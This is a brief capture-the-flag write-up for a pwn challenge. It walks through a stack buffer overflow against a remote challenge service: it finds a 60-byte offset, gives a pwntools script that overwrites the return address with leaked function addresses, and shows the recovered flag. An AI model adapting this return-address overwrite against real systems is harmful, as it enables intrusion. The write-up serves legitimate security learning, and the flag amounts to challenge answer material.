# Pwn - bh01
## Description
```
Access the network service at 3-bh02.bootupctf.net port: 8221 and find a way to get the flag.
```

```
Let's see you take over.
Get the flag from the following functions at these addresses:


Fn 3: 0x5664a6f1
Fn 2: 0x5664a6af
Fn 1: 0x5664a66d
Well?

```
So we need to execute a buffer overflow, and return to each of those 3 addresses. The addresses change every run.
Trial and error shows that the offset is 60 chars this time.
Quick python script:
```
from pwn import *

conn = remote('3-bh02.bootupctf.net',8221,level='debug')
conn.recvuntil(b"Fn 3:")
fn3 = conn.recvuntil(b"\n")
conn.recvuntil(b"Fn 2:")
fn2 = conn.recvuntil(b"\n")
conn.recvuntil(b"Fn 1:")
fn1 = conn.recvuntil(b"\n")

fn1 = fn1.strip()
fn2 = fn2.strip()
fn3 = fn3.strip()
fn1 = (p32(int(fn1,16)))
fn2 = (p32(int(fn2,16)))
fn3 = (p32(int(fn3,16)))
sleep(0.1)

conn.sendline(b'a'*60+fn3) #<- Change here
#conn.sendline(b'a'*60)
conn.recvline()
conn.recvline()
```
Manually changing this script to change which adress is being targeted allows for the flag to be outputed in 3 parts:
```
    b'Flag = mUcHR'
    b'OP_HoWRAN'
    b'dOM_9182'
```
